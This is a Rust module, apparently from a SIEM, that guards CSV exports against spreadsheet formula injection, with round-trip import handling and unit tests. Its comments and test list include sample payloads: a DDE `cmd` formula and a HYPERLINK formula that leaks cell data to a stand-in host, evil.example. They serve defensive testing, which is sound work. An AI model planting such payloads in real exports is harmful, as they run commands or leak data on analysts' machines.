// SPDX-License-Identifier: AGPL-3.0-or-later
//! Spreadsheet-safe CSV cells: the single helper every CSV export uses.
//!
//! This is a SIEM: exported cells carry attacker-controlled log data, rule and
//! source names, notes and audit text. Excel / Sheets / LibreOffice evaluate any
//! cell that starts with `=`, `+`, `-` or `@` (also behind leading whitespace)
//! or with a tab / CR / LF, so a value like `=cmd|'/c calc'!A0` or
//! `=HYPERLINK("https://evil/?"&A1)` runs on the analyst's workstation when they
//! open the export (CSV / formula injection, DDE).
//!
//! Contract:
//! - [`neutralize_formula`] prefixes a single `'` (the "treat as text" marker)
//!   to every such cell. Genuine numbers (`-5`, `-1.25`, `+3e2`) are data and
//!   stay numeric.
//! - A cell that is already `'`-prefixed formula text (`'=x`, `''=x`) gets one
//!   more `'`, so the mapping is injective and [`restore_formula`] (used by CSV
//!   *imports*) can strip exactly the one marker this module added. Import →
//!   export → import therefore round-trips without the prefix accumulating.
//! - [`escape_field`] neutralizes and then applies RFC 4180 quoting (`,` `"`
//!   CR LF). Exports that write through `csv::Writer` (which quotes on its own)
//!   call [`neutralize_formula`] only.
use std::borrow::Cow;

/// Whether `field` (with no guard quotes) would be evaluated as a formula.
fn is_formula_like(field: &str) -> bool {
    if field.starts_with(['\t', '\r', '\n']) {
        return true;
    }
    let trimmed = field.trim_start();
    let Some(first) = trimmed.chars().next() else {
        return false;
    };
    matches!(first, '=' | '+' | '-' | '@') && !is_plain_number(trimmed.trim_end())
}

/// Strict decimal literal: optional sign, digits with an optional fraction,
/// optional exponent. Narrower than `f64::from_str` on purpose (`-inf`, `-NaN`
/// are text to a spreadsheet, so they are neutralized like any other text).
fn is_plain_number(s: &str) -> bool {
    let s = s.strip_prefix(['+', '-']).unwrap_or(s);
    let (mantissa, exponent) = match s.find(['e', 'E']) {
        Some(i) => (&s[..i], Some(&s[i + 1..])),
        None => (s, None),
    };
    let (int, frac) = match mantissa.split_once('.') {
        Some((i, f)) => (i, Some(f)),
        None => (mantissa, None),
    };
    let digits = |p: &str| p.bytes().all(|b| b.is_ascii_digit());
    let mantissa_ok = digits(int)
        && frac.is_none_or(digits)
        && (!int.is_empty() || frac.is_some_and(|f| !f.is_empty()));
    let exponent_ok = exponent.is_none_or(|e| {
        let e = e.strip_prefix(['+', '-']).unwrap_or(e);
        !e.is_empty() && digits(e)
    });
    mantissa_ok && exponent_ok
}

/// Whether [`neutralize_formula`] prefixes `field`: formula text, possibly
/// behind guard quotes this module (or a previous export) already added.
fn needs_guard(field: &str) -> bool {
    is_formula_like(field.trim_start_matches('\''))
}

/// Prefix `'` to a cell a spreadsheet would evaluate as a formula.
pub fn neutralize_formula(field: &str) -> Cow<'_, str> {
    if needs_guard(field) {
        Cow::Owned(format!("'{field}"))
    } else {
        Cow::Borrowed(field)
    }
}

/// Neutralize formulas, then quote per RFC 4180 when the cell contains `,`,
/// `"`, CR or LF (embedded quotes doubled).
pub fn escape_field(field: &str) -> String {
    let field = neutralize_formula(field);
    if field.contains([',', '"', '\n', '\r']) {
        format!("\"{}\"", field.replace('"', "\"\""))
    } else {
        field.into_owned()
    }
}

/// [`escape_field`] that always wraps the cell in quotes.
pub fn escape_field_quoted(field: &str) -> String {
    format!("\"{}\"", neutralize_formula(field).replace('"', "\"\""))
}

/// Inverse of [`neutralize_formula`] for CSV imports (cells already unquoted
/// by the CSV reader): strips the single `'` marker an export added, and
/// nothing else. `'hello` and `'-5` are kept verbatim because no export would
/// have produced them from a different value.
pub fn restore_formula(field: &str) -> &str {
    match field.strip_prefix('\'') {
        Some(rest) if needs_guard(rest) => rest,
        _ => field,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const PAYLOADS: &[&str] = &[
        "=cmd|'/c calc'!A0",
        "=HYPERLINK(\"https://evil.example/?\"&A1,\"click\")",
        "@SUM(1+9)*cmd",
        "+1+1",
        "-1+1",
        "-cmd",
        "  =1+1",
        " @SUM(A1)",
        "\t=1+1",
        "\r=1+1",
        "\n=1+1",
        "\tplain",
        "\rplain",
        "-inf",
    ];

    #[test]
    fn neutralizes_every_formula_lead() {
        for p in PAYLOADS {
            assert_eq!(neutralize_formula(p), format!("'{p}"), "{p:?}");
            let escaped = escape_field(p);
            assert!(escaped.trim_start_matches('"').starts_with('\''), "{p:?} -> {escaped:?}");
            assert!(escape_field_quoted(p).starts_with("\"'"), "{p:?}");
        }
    }

    #[test]
    fn keeps_plain_text_and_numbers() {
        for v in ["", "ordinary", "Palo Alto", "a-b", "x=1", "-5", "-1.25", "+3e2", " -7 ", "-.5", "1e-3", "'hello", "'-5"] {
            assert_eq!(neutralize_formula(v), v, "{v:?}");
        }
        for v in ["-", "+", "-.", "-1e", "-5+3", "-1.2.3"] {
            assert_eq!(neutralize_formula(v), format!("'{v}"), "{v:?}");
        }
    }

    #[test]
    fn rfc4180_quoting() {
        assert_eq!(escape_field("a,\"b\""), "\"a,\"\"b\"\"\"");
        assert_eq!(escape_field("line\r\nnext"), "\"line\r\nnext\"");
        assert_eq!(escape_field("=a,b"), "\"'=a,b\"");
        assert_eq!(escape_field_quoted("plain"), "\"plain\"");
    }

    #[test]
    fn restore_inverts_neutralize_without_accumulating() {
        let mut all: Vec<String> = PAYLOADS.iter().map(|s| s.to_string()).collect();
        all.extend(["'=x", "''=x", "' =x", "'hello", "'-5", "-5", "plain", "'", "''"].map(String::from));
        for v in &all {
            let exported = neutralize_formula(v).into_owned();
            assert_eq!(restore_formula(&exported), v, "round trip {v:?} via {exported:?}");
            // A second export of the restored value is byte-identical: no growth.
            assert_eq!(neutralize_formula(restore_formula(&exported)), exported, "{v:?}");
        }
    }

    #[test]
    fn restore_leaves_unguarded_quotes_alone() {
        assert_eq!(restore_formula("'hello"), "'hello");
        assert_eq!(restore_formula("'-5"), "'-5");
        assert_eq!(restore_formula("'=x"), "=x");
        assert_eq!(restore_formula("''=x"), "'=x");
    }
}
